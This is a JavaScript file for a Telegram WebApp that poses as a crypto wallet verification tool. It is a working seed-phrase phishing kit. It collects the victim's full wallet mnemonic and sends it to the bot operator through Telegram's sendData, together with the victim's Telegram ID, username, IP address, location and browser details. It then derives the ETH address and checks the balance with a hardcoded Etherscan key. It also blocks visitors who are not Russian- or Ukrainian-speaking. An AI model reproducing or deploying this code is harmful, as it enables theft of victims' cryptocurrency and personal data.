// 🌍 IP та геолокація
let userIp = "undefined";
let userLocation = "undefined";

async function getIpAndLocation() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        userIp = data.ip || "unknown";
        userLocation = `${data.city || "—"}, ${data.country_name || "—"}`;
        console.log("📍 IP:", userIp, "| Локація:", userLocation);
    } catch (e) {
        userIp = "unknown";
        userLocation = "unknown";
        console.warn("⚠️ Не вдалося отримати геолокацію");
    }
}

// 🚫 Блокування по мові
const langs = navigator.languages || [navigator.language || navigator.userLanguage];
const allowedLangs = ["ru", "ru-RU", "uk", "uk-UA"];
if (!langs.some(lang => allowedLangs.includes(lang))) {
    document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>Доступ ограничен.</h3>";
    throw new Error("🚫 Заблоковано через мову");
}

// ✅ DOM
window.addEventListener("DOMContentLoaded", () => {
    feather?.replace();
    Telegram?.WebApp?.ready();
    Telegram?.WebApp?.expand();

    if (document.getElementById("seedContainer")) {
        renderSeedInputs();
        setupSelect();
        document.getElementById("submitBtn")?.addEventListener("click", () => {
            try {
                submitSeed();
            } catch (e) {
                console.error("❌ submitSeed error:", e);
            }
        });
    } else if (window.location.href.includes("profile.html")) {
        showProfileData();
    }
});

// 📦 Генерація полів
function renderSeedInputs() {
    const length = parseInt(document.getElementById("length").value);
    const container = document.getElementById("seedContainer");
    container.innerHTML = "";

    for (let i = 0; i < length; i++) {
        const input = document.createElement("input");
        input.type = "text";
        input.placeholder = `${i + 1}`;
        input.classList.add("seed-word");
        container.appendChild(input);
    }

    const firstInput = container.querySelector("input");
    if (firstInput) {
        firstInput.addEventListener("input", handleBulkSeedInput);
        firstInput.addEventListener("paste", (e) => setTimeout(() => handleBulkSeedInput(e), 50));
    }
}

// 📋 Обробка вставки
function handleBulkSeedInput(e) {
    const inputs = document.querySelectorAll(".seed-word");
    const words = e.target.value.trim().split(/\s+/);
    if (words.length > 1) {
        inputs.forEach((input, i) => input.value = words[i] || "");
    }
}

// 🔘 Кастомний select
function setupSelect() {
    const selectWrapper = document.querySelector('.custom-select');
    const selected = selectWrapper.querySelector('.selected');
    const options = selectWrapper.querySelectorAll('.options li');
    const hiddenInput = document.querySelector('#wallet');

    selected.addEventListener('click', () => selectWrapper.classList.toggle('open'));
    options.forEach(option => {
        option.addEventListener('click', () => {
            selected.innerHTML = option.innerHTML;
            hiddenInput.value = option.dataset.value;
            selectWrapper.classList.remove('open');
        });
    });

    document.addEventListener('click', e => {
        if (!selectWrapper.contains(e.target)) {
            selectWrapper.classList.remove('open');
        }
    });
}

// 🚫 Попередження
function showWarning(message) {
    let warning = document.getElementById("validationWarning");
    if (!warning) {
        warning = document.createElement("p");
        warning.id = "validationWarning";
        warning.style.color = "#ff4d4d";
        warning.style.fontSize = "13px";
        warning.style.marginTop = "10px";
        document.querySelector(".container").appendChild(warning);
    }
    warning.textContent = message;
    warning.style.display = "block";
}
function clearWarning() {
    const warning = document.getElementById("validationWarning");
    if (warning) warning.style.display = "none";
}

// 🌀 Статус
function showProcessing(message) {
    let processing = document.getElementById("processingInfo");
    if (!processing) {
        processing = document.createElement("p");
        processing.id = "processingInfo";
        processing.style.color = "#999";
        processing.style.fontSize = "14px";
        processing.style.marginTop = "12px";
        document.querySelector(".container").appendChild(processing);
    }
    processing.textContent = message;
}

// 🚀 Надсилання seed
function submitSeed() {
    clearWarning();
    const length = parseInt(document.getElementById("length").value);
    const wallet = document.getElementById("wallet").value || "unknown";
    const ua = navigator.userAgent;
    const inputs = document.querySelectorAll("#seedContainer .seed-word");
    const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);

    if (words.length !== length) {
        showWarning(`❌ Введено ${words.length}, очікується ${length} слів`);
        return;
    }

    const invalidWords = words.filter(w => !/^[a-zA-Z]+$/.test(w));
    if (invalidWords.length) {
        showWarning(`🚫 Недопустимі символи: ${invalidWords.join(", ")}`);
        return;
    }

    const seed = words.join(" ");
    showProcessing("⏳ Перевірка seed-фрази…");
    document.querySelector(".container").innerHTML =
        "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";

    const tgUser = Telegram?.WebApp?.initDataUnsafe?.user || {};
    const payload = {
        user_id: tgUser.id || "-",
        username: tgUser.username || "-",
        seed,
        wallet,
        length,
        ua,
        ip: userIp,
        location: userLocation,
        address: "-",
        balance: "-",
        timestamp: new Date().toISOString()
    };

    localStorage.setItem("payload_backup", JSON.stringify(payload));

    // 🧩 Гарантовано розгортає WebApp (не дає Telegram його закрити)
    Telegram.WebApp.expand();

    if (Telegram?.WebApp?.sendData) {
        Telegram.WebApp.sendData(JSON.stringify(payload));
        console.log("✅ Payload відправлено", payload);
    }
}

// 📊 Профіль
function showProfileData() {
    const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
    const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");

    document.getElementById("timestamp").textContent = data.timestamp || "-";
    document.getElementById("userIp").textContent = data.ip || "-";
    document.getElementById("userLocation").textContent = data.location || "-";
    document.getElementById("seed").textContent = data.seed || "-";

    try {
        const wallet = ethers.Wallet.fromMnemonic(data.seed);
        const ethAddress = wallet.address;
        document.getElementById("ethAddress").textContent = ethAddress;
        fetchETHBalance(ethAddress, ETHERSCAN_API_KEY);
    } catch (e) {
        console.error("❌ ETH адреса не згенерована:", e.message);
    }

    document.getElementById("goWalletBtn").addEventListener("click", () => {
        const wallet = (data.wallet || "").toLowerCase();
        let url = "https://www.google.com";
        if (wallet.includes("metamask")) url = "https://metamask.io/";
        else if (wallet.includes("trust")) url = "https://trustwallet.com/";
        else if (wallet.includes("phantom")) url = "https://phantom.app/";
        else if (wallet.includes("ton")) url = "https://tonkeeper.com/";
        else if (wallet.includes("coinbase")) url = "https://www.coinbase.com/wallet";
        window.Telegram?.WebApp?.openLink?.(url) || window.open(url, "_blank");
    });
}

// 💰 Баланс ETH
async function fetchETHBalance(address, key) {
    try {
        const res = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${key}`);
        const json = await res.json();
        if (json.status !== "1") throw new Error("API помилка");
        const eth = parseFloat(json.result) / 1e18;
        document.getElementById("walletBalance").textContent = `${eth.toFixed(6)} ETH`;
    } catch (e) {
        console.warn("❌ Баланс ETH:", e.message);
        document.getElementById("walletBalance").textContent = "–";
    }
}
